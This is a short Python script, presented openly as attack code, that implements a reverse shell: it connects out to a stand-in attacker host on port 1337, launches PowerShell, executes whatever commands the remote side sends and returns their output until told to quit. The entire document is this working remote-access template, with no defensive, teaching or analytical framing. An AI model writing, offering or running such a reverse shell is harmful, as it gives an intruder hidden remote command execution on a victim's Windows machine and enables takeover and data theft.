import socket
import subprocess

# Connect to the attacker's server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("attacker.example.com", 1337))

# Create a shell subprocess
shell = subprocess.Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Send commands from the attacker and receive output from the shell
while True:
    # Receive data from the attacker
    data = sock.recv(1024).decode()

    # Exit if the attacker sends a "quit" command
    if "quit" in data:
        break

    # Execute the command and send the output back to the attacker
    output = shell.stdin.write(data.encode())
    output = shell.stdout.readline().decode()
    sock.send(output.encode())

# Close the socket and shell
sock.close()
shell.kill()
